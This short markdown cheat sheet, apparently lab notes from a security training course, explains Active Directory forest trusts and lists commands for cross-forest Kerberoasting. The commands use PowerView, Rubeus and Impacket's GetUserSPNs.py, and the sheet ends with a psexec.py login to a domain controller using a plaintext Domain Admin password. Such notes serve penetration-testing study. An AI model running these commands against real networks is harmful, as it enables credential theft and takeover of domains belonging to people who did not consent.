# Attacking Cross-Forest Trust

It means performing attacks that abuse the trust relationship between two separate Microsoft Active Directory forests.

## Forest Trust means

In Active Directory:

A domain = a security boundary inside AD <br>
A forest = a collection of one or more domains sharing the same AD schema/configuration

```
FOREST A                     FOREST B
corp.local                   partner.local
 └── sales.corp.local
```

## Trust Abuse means

Attackers try to abuse that trust relationship to:

move laterally between forests <br>
gain access to another organization/domain<br>
escalate privileges<br>
steal credentials<br>
compromise the trusted forest<br>


## Difference between domain trust and forest trust

<img width="1145" height="590" alt="image" src="https://github.com/user-attachments/assets/edfd7962-b784-4b90-a5f0-72d844dc82c5" />


# From Windows ( Cross-forest kerberoasting must need -domain flag in command )

1.We can use PowerView to enumerate accounts within the target domain that have associated Service Principal Names (SPNs).
```
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

2.Let's perform a Kerberoasting attack across the trust using Rubeus and crack the offline hash
```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

# From Linux (-target-domain flag)

GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

### Crack the TGS

GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

### Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password

psexec.py ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@172.16.5.238


